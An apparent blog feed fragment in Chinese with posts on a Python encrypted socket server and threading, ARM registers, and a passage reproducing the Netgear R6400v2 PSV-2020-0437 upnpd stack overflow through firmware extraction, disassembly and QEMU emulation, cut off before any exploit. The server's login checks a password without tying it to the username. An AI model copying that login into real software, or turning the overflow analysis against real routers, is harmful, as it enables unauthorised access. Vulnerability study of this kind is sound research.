class="line">        password = (sock.recv(1024))</span><br><span class="line">        decrypted_password = aes.decrypt(password)</span><br><span class="line">        password = (unpad(decrypted_password, 16)).decode()</span><br><span class="line">        cursor.execute(&quot;SELECT password FROM users WHERE password = ?&quot;, (password,))</span><br><span class="line">        result = cursor.fetchone()</span><br><span class="line">        if result != None:</span><br><span class="line">            sock.send(&quot;身份验证通过&quot;.encode())</span><br><span class="line">            print(&quot;密码正确&quot;)</span><br><span class="line">            if username == &quot;admin&quot;:</span><br><span class="line">                permission_value = 1</span><br><span class="line">            else :</span><br><span class="line">                permission_value = 0</span><br><span class="line">            return permission_value</span><br><span class="line">        else :</span><br><span class="line">            sock.send(&quot;密码错误，终止连接&quot;.encode())</span><br><span class="line">            sock.close()</span><br><span class="line">            return 3</span><br><span class="line">    else:</span><br><span class="line">        sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode())</span><br><span class="line">        sock.close()</span><br><span class="line">        return 3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def menu(sock):</span><br><span class="line">    text = &quot;开始进行数据传输&quot;</span><br><span class="line">    sock.send(text.encode())</span><br><span class="line"></span><br><span class="line">def transfer_txt(addr,data):</span><br><span class="line">    print(f&quot;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;&quot;)</span><br><span class="line"></span><br><span class="line">def transfer_file(sock,data):  #处理非切片数据</span><br><span class="line">    data_type = mime.from_buffer(data)</span><br><span class="line">    if data_type == &quot;text/plain&quot;:</span><br><span class="line">        with open(&quot;output.txt&quot;, &#x27;wb&#x27;) as f:</span><br><span class="line">            f.write(data.encode())</span><br><span class="line">    sock.send(&quot;成功接受到文件\n&quot;.encode())</span><br><span class="line"></span><br><span class="line">def transfer_file2(sock,data,sliced_sum,sliced_num,shared_key): #处理切片数据</span><br><span class="line">    data_bytes = data</span><br><span class="line">    while sliced_num != sliced_sum-1:</span><br><span class="line">        orign_data = (sock.recv(2048))</span><br><span class="line">        if len(orign_data) == 0:</span><br><span class="line">            print(&quot;客户机意外中断连接&quot;)</span><br><span class="line">            return</span><br><span class="line">        sliced_sum,sliced_num,data_type,data,value = unpack_data(sock,shared_key,orign_data)</span><br><span class="line">        data_bytes += data</span><br><span class="line">    data_type = mime.from_buffer(data_bytes)</span><br><span class="line">    if data_type == &quot;image/png&quot;:</span><br><span class="line">        with open(&quot;output.png&quot;, &#x27;wb&#x27;) as f:</span><br><span class="line">            f.write(data_bytes)</span><br><span class="line">    elif data_type == &quot;audio/mpeg&quot;:</span><br><span class="line">        with open(&quot;output.mp3&quot;, &#x27;wb&#x27;) as f:</span><br><span class="line">            f.write(data_bytes)</span><br><span class="line">    sock.send(&quot;成功接受到文件\n&quot;.encode())</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def register(permission_value,sock,shared_key,cursor,data):</span><br><span class="line">    if permission_value == 0:                #管理员权限的检验较为简单</span><br><span class="line">        sock.send(&quot;你所登录的用户并没有拥有管理员权限 无法注册用户&quot;.encode())</span><br><span class="line">        return</span><br><span class="line">    else :  </span><br><span class="line">        parts = data.split(b&#x27;;&#x27;)</span><br><span class="line">        username = parts[0]</span><br><span class="line">        password = parts[1]</span><br><span class="line">        try:</span><br><span class="line">            # 插入新的用户数据</span><br><span class="line">            cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (username, password))</span><br><span class="line">            conn.commit()</span><br><span class="line">            sock.send(&quot;用户注册成功&quot;.encode())</span><br><span class="line">        except sqlite3.IntegrityError:</span><br><span class="line">            sock.send(&quot;用户已存在&quot;.encode())</span><br><span class="line">        except Exception as e:</span><br><span class="line">            sock.send(e.encode())</span><br><span class="line"></span><br><span class="line">def verify_md5(data, original_md5,sock):</span><br><span class="line">    current_md5 = md5_encrypt(data)</span><br><span class="line">    return current_md5 == original_md5</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line"></span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    private_key_server = parameters.generate_private_key()</span><br><span class="line">    public_key_server = private_key_server.public_key()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议</span><br><span class="line">    s.bind((&quot;10.0.137.2&quot;,6666))</span><br><span class="line">    s.listen(5) #最多连接5个客户端</span><br><span class="line">    while 1:</span><br><span class="line">        public_key_client,sock,addr = key_switch(s,public_key_server)</span><br><span class="line">        print(&quot;公钥交换成功&quot;)</span><br><span class="line">        print(&quot;开始计算共享密钥&quot;)</span><br><span class="line">        shared_key = private_key_server.exchange(public_key_client)</span><br><span class="line">        print(&quot;开始进行身份验证&quot;)</span><br><span class="line">        permission_value = Authentication(sock,shared_key,cursor)</span><br><span class="line">        if permission_value == 3:</span><br><span class="line">            print(&quot;客户机意外中断连接&quot;)</span><br><span class="line">            continue</span><br><span class="line">        while 1:</span><br><span class="line">            menu(sock)</span><br><span class="line">            orign_data = (sock.recv(2048))</span><br><span class="line">            if len(orign_data) == 0:</span><br><span class="line">                print(&quot;客户机意外中断连接&quot;)</span><br><span class="line">                break</span><br><span class="line">            sliced_sum,sliced_num,data_type,data,value = unpack_data(sock,shared_key,orign_data)</span><br><span class="line">            if data_type == 1:</span><br><span class="line">                transfer_txt(addr,data)</span><br><span class="line">            elif data_type == 2:</span><br><span class="line">                if sliced_sum != 0 or sliced_num != 0:</span><br><span class="line">                    transfer_file2(sock,data,sliced_sum,sliced_num,shared_key)</span><br><span class="line">                else:</span><br><span class="line">                    transfer_file(sock,data)</span><br><span class="line">            elif data_type ==3:</span><br><span class="line">                register(permission_value,sock,shared_key,cursor,data)</span><br><span class="line">        sock.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="v0-6"><a href="#v0-6" class="headerlink" title="v0.6"></a>v0.6</h2><p>以前的代码实际上是没有考虑过多端连接的 所以这一版的代码主要针对多端连接进行优化<br>原本的代码 client1连接后  client2能够连接上服务器 但是交换公钥的时候会阻塞<br>这是因为公钥交换相关的代码没有考虑到多端的情况<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411032223778.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411032223778.png" alt="image.png"></a><br>来假设一种情况 客户机A连接上服务端后 进行密钥交换完成后 开始进入数据传输阶段<br>按照原本的程序设计 此时的服务端程序已经进入了while循环处理数据传输的请求<br>但是如果此时有客户机B想要连接服务端 服务端就不会去处理客户机B的密钥交换<br>为了解决这个问题 应该要使用线程池来处理多线程的情况<br>多线程的实现难点应该在于确保多个线程之间的共享数据同步 在设计程序之间并没有这方面的经验 所以打算先通过编写几个简单的程序来熟悉一下</p><h3 id="多线程实现的学习"><a href="#多线程实现的学习" class="headerlink" title="多线程实现的学习"></a>多线程实现的学习</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line"></span><br><span class="line">def print_name(name):</span><br><span class="line">    print(f&quot;当前轮到&#123;name&#125;执行&quot;)</span><br><span class="line">    print(threading.current_thread().name)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;多线程测试&quot;)</span><br><span class="line">    thread1 = threading.Thread(target=print_name, args=(&quot;线程1&quot;,))</span><br><span class="line">    thread2 = threading.Thread(target=print_name,args=(&quot;线程2&quot;,))</span><br><span class="line">    thread1.start()</span><br><span class="line">    thread2.start()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main() </span><br></pre></td></tr></table></figure><p>通过定义一个thread对象 并且赋值target 即需要该线程执行的函数 同时给予参数<br>定义完成后thread对象完成初始化 通过start来运行线程<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411041822760.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411041822760.png" alt="image.png"></a><br>主进程和线程是同时运行的 如果想要让主进程阻塞 等待线程运行结束后再运行主线程<br>这时候可以使用join来让主进程等待线程执行完毕</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line"></span><br><span class="line">def print_name(name):</span><br><span class="line">    print(f&quot;当前轮到&#123;name&#125;执行&quot;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;多线程测试&quot;)</span><br><span class="line">    thread1 = threading.Thread(target=print_name, args=(&quot;线程1&quot;,))</span><br><span class="line">    # thread2 = threading.Thread(target=print_name,args=(&quot;线程2&quot;,))</span><br><span class="line">    thread1.start()</span><br><span class="line">    print(f&quot;thread1线程当前存活情况&#123;thread1.is_alive()&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main() </span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411041827877.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411041827877.png" alt="image.png"></a><br>接下来加入join</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line"></span><br><span class="line">def print_name(name):</span><br><span class="line">    print(f&quot;当前轮到&#123;name&#125;执行&quot;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;多线程测试&quot;)</span><br><span class="line">    thread1 = threading.Thread(target=print_name, args=(&quot;线程1&quot;,))</span><br><span class="line">    # thread2 = threading.Thread(target=print_name,args=(&quot;线程2&quot;,))</span><br><span class="line">    thread1.start()</span><br><span class="line">    thread1.join(1)</span><br><span class="line">    print(f&quot;thread1线程当前存活情况&#123;thread1.is_alive()&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main() </span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411041827424.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411041827424.png" alt="image.png"></a><br>join的原理是等待对应thread对象执行完毕 或者给予参数 等待参数时间<br>所以也可以用来规划两个进程的执行先后顺序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def print_name(name):</span><br><span class="line">    time.sleep(0.5)</span><br><span class="line">    print(f&quot;当前轮到&#123;name&#125;执行&quot;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;多线程测试&quot;)</span><br><span class="line">    thread1 = threading.Thread(target=print_name, args=(&quot;线程1&quot;,))</span><br><span class="line">    thread2 = threading.Thread(target=print_name,args=(&quot;线程2&quot;,))</span><br><span class="line">    thread1.start()</span><br><span class="line">    thread2.start()</span><br><span class="line">    thread2.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main() </span><br></pre></td></tr></table></figure><p>上述代码应该是先执行thread1 但是由于thread2调用了join 此时应该会先等待thread2执行完毕再执行其他线程  这里print_name函数的sleep也是为了防止thread1执行过快导致还没主进程还没执行thread2.join()就结束了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411042034813.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411042034813.png" alt="image.png"></a><br>接着来看下面的程序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def print_name(name):</span><br><span class="line">    for i in range(10):</span><br><span class="line">        time.sleep(0.5)</span><br><span class="line">        print(f&quot;现在是线程&#123;threading.current_thread().name&#125;第&#123;i&#125;次执行循环&quot;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;多线程测试&quot;)</span><br><span class="line">    thread1 = threading.Thread(target=print_name, args=(&quot;线程1&quot;,))</span><br><span class="line">    thread1.start()</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print(&quot;主进程即将结束&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main() </span><br></pre></td></tr></table></figure><p>按照预期的效果 在输出”主进程即将结束”后 主进程应该就结束了 同时thread1执行全部循环至少需要5s 而主进程执行时间应该在2-5以内 但是事实是主进程要一直等到thread1执行完毕才能结束<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411042040695.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411042040695.png" alt="image.png"></a><br>这一点是由定义thread对象的时候 一个叫daemon的参数决定的<br>其默认值为False 即主进程等待thread1线程执行完毕后才能结束 如果改为True 主进程结束时 线程就会结束</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def print_name(name):</span><br><span class="line">    for i in range(10):</span><br><span class="line">        time.sleep(0.5)</span><br><span class="line">        print(f&quot;现在是线程&#123;threading.current_thread().name&#125;第&#123;i&#125;次执行循环&quot;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;多线程测试&quot;)</span><br><span class="line">    thread1 = threading.Thread(target=print_name, args=(&quot;线程1&quot;,),daemon=True)</span><br><span class="line">    thread1.start()</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print(&quot;主进程即将结束&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main() </span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411042044434.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411042044434.png" alt="image.png"></a><br>如果想要让线程1执行两个函数呢<br>即执行完函数A后再执行函数B 这一点实现起来也很简单 只需要在函数A的最后调用函数B即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def next_task():</span><br><span class="line">    print(&quot;这是第二个任务&quot;)</span><br><span class="line"></span><br><span class="line">def print_name(name):</span><br><span class="line">    print(&quot;这是第一个任务&quot;)</span><br><span class="line">    next_task()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;多线程测试&quot;)</span><br><span class="line">    thread1 = threading.Thread(target=print_name, args=(&quot;线程1&quot;,))</span><br><span class="line">    thread1.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main() </span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411042107756.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411042107756.png" alt="image.png"></a><br>但是这一操作的弊端也很明显 那就是假如此时我们需要创建两个线程<br>线程1需要先执行函数A再执行函数B<br>线程2需要先执行函数B再执行函数A<br>这时候就会产生冲突 这又得去编写一个中转函数来识别需求 然后做if分支了 显然十分麻烦<br>这时候就可以自定义thread类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">class myself_thread(threading.Thread):</span><br><span class="line">    </span><br><span class="line">    def __init__(self,name = None):</span><br><span class="line">        threading.Thread.__init__(self,name=name)</span><br><span class="line">    </span><br><span class="line">    def run(self):</span><br><span class="line">        print(f&quot;这是线程&#123;self.name&#125;在运行&quot;)</span><br><span class="line"></span><br><span class="line">    def test(self):</span><br><span class="line">        print(&quot;这是一个测试函数&quot;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;多线程测试&quot;)</span><br><span class="line">    thread1 = myself_thread()</span><br><span class="line">    thread1.run()</span><br><span class="line">    thread1.start()</span><br><span class="line">    thread1.test()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main() </span><br></pre></td></tr></table></figure><p>如上述代码 我们自定义了一个myself_thread类 并且继承了threading.Thread 这个类的run函数以及其他函数都可以由我们自定义 针对不同的需求来调用函数也变得十分简单<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411042110907.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202411042110907.png" alt="image.png"></a><br>学习到了这里 大概理解python中线程调用的基本用法了 接下来的任务就是将多线程加入到程序中</p><h3 id="多线程应用"><a href="#多线程应用" class="headerlink" title="多线程应用"></a>多线程应用</h3><p>目前的整改思路如下:<br>服务端</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="extra" scheme="http://example.com/categories/extra/"/>
    
    
  </entry>
  
  <entry>
    <title>arm架构学习</title>
    <link href="http://example.com/2024/10/10/arm%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2024/10/10/arm%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-10-10T02:51:26.000Z</published>
    <updated>2024-10-26T03:39:07.264Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install libncurses5-dev gcc-arm-linux-gnueabi build-essential synaptic gcc-aarch64-linux-gnu</span><br></pre></td></tr></table></figure><h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><p>与先前学过的inter指令集不同的是 arm采用的是精简指令集 虽然可以更快的执行指令 但是由于指令较少 因此在实现功能的时候会比inter更加繁琐<br>x86架构中 可以直接对内存数据进行操作 但是在arm架构中 只能通过寄存器来中转 先将内存中的数据存入寄存器再操作 这一点类似8086<br>arm架构下 又可以细分为armel和armhf 这是在32位下 至于64位 则都是采用armhf<br>二者的区别在于浮点运算上 他们在浮点运算时都会使用fpu寄存器 但是前者在传参的时候会使用普通寄存器 而后者在传参时则会使用fpu寄存器 所以armhf的浮点运算能力更强<br>ARM一共有37个寄存器 其中31个32位的通用寄存器 以及6个32位的状态寄存器<br>ARM处理器一共有7种模式<br>用户模式(usr)：ARM处理器正常的程序执行状态。非特权模式。<br>快速中断模式(fiq)：用于高速数据传输或通道处理。<br>外部中断模式(irq)：用于通用的中断处理。<br>管理模式(svc)：操作系统使用的保护模式。<br>数据访问终止模式(abt)：当数据或指令预取终止时进入该模式，可用于虚拟存储及存储保护。<br>系统模式(sys)：运行具有特权的操作系统任务。<br>定义指令中止模式(und)：当未定义的指令执行时进入该模式，可用于支持硬件协处理器的软件仿真。<br>任意处理器模式下 可使用的寄存器包含15个通用寄存器 即R0-R14还有程序计数器PC以及一两个状态寄存器<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410242219483.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410242219483.png" alt="image.png"></a><br>R0寄存器可以用于存储临时值 也用于存储函数调用后的返回值<br>R0~R3寄存器就负责存储调用函数的参数<br>R7寄存器用于存储系统调用号 (这一点倒是比x86做的好 x86的rax寄存器又是存储函数返回值又是存储系统调用号的 可以通过read函数来控制rax寄存器的值 然后就可以自定义系统调用号<br>R11寄存器用来存储回溯信息 也可以作为局部变量 (这里的回溯信息有点疑惑是具体指什么 如果是用来返回父函数的 又和LR寄存器冲突 希望下面的研究能够了解一下<br>R13寄存器就是堆栈指针 指向堆栈的顶部<br>R14寄存器类似于rbp寄存器 存储调用函数的下一条指令 供子函数返回父函数<br>PC寄存器类似于rip寄存器 存储当前执行的目标地址 不过要特别注意的是 arm架构的pc寄存器会存储当前执行的目标地址+8 (这里具体的数值待研究 不清楚32位和64位架构是否都是8)</p><h1 id="编译并运行一个arm架构的二进制文件"><a href="#编译并运行一个arm架构的二进制文件" class="headerlink" title="编译并运行一个arm架构的二进制文件"></a>编译并运行一个arm架构的二进制文件</h1></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>PSV-2020-0437漏洞复现</title>
    <link href="http://example.com/2024/09/21/psv-2020-0437%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2024/09/21/psv-2020-0437%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-09-21T01:53:17.000Z</published>
    <updated>2024-10-10T02:31:45.475Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>本次漏洞复现 所选择的设备为 Netgear R6400v2 固件版本为1.0.4.102<br>参照文章 <a href="https://bestwing.me/PSV-2020-0437-Buffer-Overflow-on-Some-Netgear-outers.html">https://bestwing.me/PSV-2020-0437-Buffer-Overflow-on-Some-Netgear-outers.html</a><br>固件下载地址 <a href="https://www.downloads.netgear.com/files/GDC/R6400v2/R6400v2-V1.0.4.102_10.0.75.zip">https://www.downloads.netgear.com/files/GDC/R6400v2/R6400v2-V1.0.4.102_10.0.75.zip</a></p><h1 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h1><p>这里下载到的固件是zip压缩文件 unzip解压后 发现需要被提取的文件格式是chk<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409211004578.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409211004578.png" alt="image.png"></a><br>其通常是程序或者工具生成的检查点或者状态文件<br>不过还是照常使用binwalk提取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">binwalk -Me R6400v2-V1.0.4.102_10.0.75.chk</span><br></pre></td></tr></table></figure><h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><p>先使用firmwalker工具来大致的了解固件中可能存在的漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./firmwalker.sh ../iot/_R6400v2-V1.0.4.102_10.0.75.chk.extracted/squashfs-root ../firmwalker.txt</span><br></pre></td></tr></table></figure><p>发现存在了telnet服务 联想到之前复现过的一个cve是通过越权开启telnet 同时存在硬编码的账密<br>不过这题是否存在这个问题 还需要后续的挖掘<br>先步入到usr&#x2F;sbin目录中 查看该固件涉及到的协议<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231037427.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231037427.png" alt="image.png"></a><br>存在httpd和upnpd 其中upnpd所存在的漏洞相对较多 这里先重点分析一下<br>32位小端序的arm架构 使用ida32查看反汇编代码<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231038336.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231038336.png" alt="image.png"></a><br>自己看了main函数后 没发现什么端倪 于是查看了教程 发现是通过recvfrom函数来定位漏洞函数的<br>该函数基于套接字来传输 所以利用这个函数来查找可以由我们输入的数据引发的漏洞确实是一个好思路 学到了<br>依靠交叉索引定位到sub_1B0E0函数<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231125486.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231125486.png" alt="image.png"></a><br>这里可以往v50数组中读入0x1fff的数据 下面存在一个if判断<br>如果upnp_turn_on的值为1 并且输入的数据小于0x100字节 就可以进入sub_23FB0函数 v50数组作为a1参数<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231454706.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231454706.png" alt="image.png"></a><br>在该函数一开始 利用strncpy将a1的数据复制给了v39 同时v41指针指向v39<br>带着v42参数一起进入了sub_B9EC函数<br>这个函数用于在v41中查找v42字符串 同时返回v41包含该字串的下一个字节的地址<br>结合下面的代码 可以看出这里是在针对a1数组中的数据进行参数数值的提取<br>92行出现了一个新的函数sub_22D20<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231500111.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231500111.png" alt="image.png"></a><br>这个函数中也存在strncpy函数 观察一下拷贝的字节长度是否能够达到栈溢出<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231525169.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202409231525169.png" alt="image.png"></a><br>首先是在a1字符串里查找MX: 然后再次查找\r\n<br>同时对于位置进行了检测 确保\r\n位于MX:的后三个字节开外<br>strncpy函数复制字节的长度为 v5-(v4+3) 也就是靠\r\n来决定复制的长度<br>而v7数组的长度显然小于可以复制的长度 所以这里存在栈溢出</p><h1 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h1><p>这里使用qemu来进行系统模拟</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">sudo tunctl -t tap1 -u root</span><br><span class="line"></span><br><span class="line">sudo ifconfig tap1 192.168.6.2</span><br><span class="line"></span><br><span class="line">sudo qemu-system-arm \</span><br><span class="line">    -M vexpress-a9 \</span><br><span class="line">    -kernel ./armhf/vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">    -initrd ./armhf/initrd.img-3.2.0-4-vexpress \</span><br><span class="line">    -drive if=sd,file=./armhf/debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line">    -net nic -net tap,ifname=tap1,script=no,downscript=no \</span><br><span class="line">    -nographic</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>随后进入模拟机中配置eth0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig eth0 192.168.6.10</span><br></pre></td></tr></table></figure><p>然后用scp传输squashfs-root文件夹到模拟机中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -cvf 1.tar ./squashfs-root</span><br><span class="line">scp 1.tar root@192.168.6.10:/root</span><br><span class="line">tar -xvf 1.tar</span><br></pre></td></tr></table></figure><p>随后挂载目录 准备运行upnp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -t proc /proc ./squashfs-root/proc</span><br><span class="line">mount -o bind /dev ./squashfs-root/dev</span><br><span class="line">chroot ./squashfs-root/ /bin/sh</span><br></pre></td></tr></table></figure><p>直接运行upnpd发现并没有回显<br>这是因为NVRAM(非易失性RAM)用于存储路由器的配置信息 upnpd运行时需要用到其中部分的信息 在没有实体硬件的情况下 这里使用LD_PRELOAD环境变量来引导<br>这里使用这个项目来帮助我们搭建环境<br><a href="https://github.com/therealsaumil/custom_nvram">https://github.com/therealsaumil/custom_nvram</a><br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410091826169.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410091826169.png" alt="image.png"></a><br>这里直接使用项目中已经编译好的nvram.so文件<br>接下来执行下面指令 看看是否能够运行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LD_PRELOAD=&quot;/custom_nvram_r6250.so&quot; ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><p>遇到了第二个报错 缺少libc.so.6<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410091837720.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410091837720.png" alt="image.png"></a><br>libc.so.0和libc.so.6是不同版本的c标准库 数字的区别在于版本号<br>这里直接更改名字 将libc.so.0复制一份并且修改为libc.so.6即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv ./lib/libc.so.0 